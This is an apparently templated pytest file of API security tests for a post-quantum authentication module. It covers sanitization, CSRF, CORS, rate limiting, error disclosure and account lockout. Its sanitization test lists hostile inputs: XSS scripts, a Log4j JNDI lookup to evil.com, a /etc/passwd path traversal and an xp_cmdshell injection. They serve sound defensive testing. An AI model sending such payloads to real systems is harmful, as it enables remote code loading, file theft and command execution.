import pytest
import json
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../..'))

from your_pqc_module import PQCAuth

class TestAPISecurity:

    def test_input_sanitization(self):
        """Test API input sanitization"""
        pqc = PQCAuth()

        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/attack}",  # Log4j style
            "../../etc/passwd",  # Path traversal
            "'; exec xp_cmdshell('dir'); --",  # Command injection
        ]

        for malicious_input in malicious_inputs:
            try:
                sanitized = pqc.sanitize_input(malicious_input)

                assert "<script>" not in sanitized.lower()
                assert "javascript:" not in sanitized.lower()
                assert "jndi:" not in sanitized.lower()
                assert "../" not in sanitized
                assert "exec" not in sanitized.lower()

            except ValueError:
                pass

    def test_csrf_protection(self):
        """Test CSRF protection mechanisms"""
        pqc = PQCAuth()

        user_session = pqc.mock_create_session("test_user")
        csrf_token = pqc.mock_generate_csrf_token(user_session)

        result = pqc.mock_protected_operation(user_session, csrf_token, "test_action")
        assert result == True

        with pytest.raises((ValueError, PermissionError)):
            pqc.mock_protected_operation(user_session, None, "test_action")

        with pytest.raises((ValueError, PermissionError)):
            pqc.mock_protected_operation(user_session, "invalid_token", "test_action")

    def test_cors_security(self):
        """Test CORS security configuration"""
        pqc = PQCAuth()

        allowed_origins = pqc.mock_get_cors_allowed_origins()

        assert "*" not in allowed_origins, "Wildcard CORS origin detected - security risk"

        assert len(allowed_origins) > 0, "No CORS origins configured"

        valid_origin = allowed_origins[0] if allowed_origins else "https://trusted-domain.com"
        assert pqc.mock_validate_cors_origin(valid_origin)

        assert not pqc.mock_validate_cors_origin("https://evil-domain.com")
        assert not pqc.mock_validate_cors_origin("javascript:alert('xss')")

    def test_content_type_validation(self):
        """Test content type validation"""
        pqc = PQCAuth()

        valid_content_types = [
            "application/json",
            "application/x-www-form-urlencoded",
            "multipart/form-data"
        ]

        for content_type in valid_content_types:
            assert pqc.mock_validate_content_type(content_type)

        invalid_content_types = [
            "text/html",  # Could contain XSS
            "application/javascript",  # Code execution risk
            "text/xml",  # XXE attack risk
            "application/xml",  # XXE attack risk
        ]

        for content_type in invalid_content_types:
            assert not pqc.mock_validate_content_type(content_type)

    def test_api_rate_limiting(self):
        """Test API rate limiting"""
        pqc = PQCAuth()

        rate_limit_exceeded = False

        for i in range(100):  # Try many requests
            try:
                result = pqc.mock_rate_limited_endpoint(f"request_{i}")
                assert result is not None
            except Exception as e:
                if "rate limit" in str(e).lower() or "too many" in str(e).lower():
                    rate_limit_exceeded = True
                    break

        assert rate_limit_exceeded, "Rate limiting not working - DoS vulnerability"

    def test_error_information_disclosure(self):
        """Test that errors don't disclose sensitive information"""
        pqc = PQCAuth()

        error_tests = [
            lambda: pqc.authenticate("nonexistent_user", "password"),
            lambda: pqc.mock_validate_token("invalid_token"),
            lambda: pqc.mock_decrypt_data("malformed_data"),
            lambda: pqc.mock_access_protected_resource("unauthorized"),
        ]

        for error_test in error_tests:
            try:
                error_test()
            except Exception as e:
                error_message = str(e).lower()

                sensitive_terms = [
                    "password", "key", "secret", "token", "hash",
                    "database", "sql", "query", "stack trace",
                    "file path", "directory", "server", "internal"
                ]

                for term in sensitive_terms:
                    assert term not in error_message, f"Error message contains sensitive term '{term}': {e}"

    def test_authentication_security(self):
        """Test authentication security measures"""
        pqc = PQCAuth()

        weak_passwords = [
            "123",
            "password",
            "abc",
            "",
            "a",
        ]

        for weak_password in weak_passwords:
            with pytest.raises((ValueError, Exception)):
                pqc.mock_register_user("test_user", weak_password)

        pqc.mock_register_user("lockout_test", "Strong_Password_123!")

        failed_attempts = 0
        for i in range(10):  # Try many failed logins
            try:
                pqc.authenticate("lockout_test", "wrong_password")
            except Exception as e:
                if "locked" in str(e).lower() or "blocked" in str(e).lower():
                    assert i >= 3, "Account locked too quickly"
                    break
                failed_attempts += 1

        assert failed_attempts < 10, "Account lockout not working"
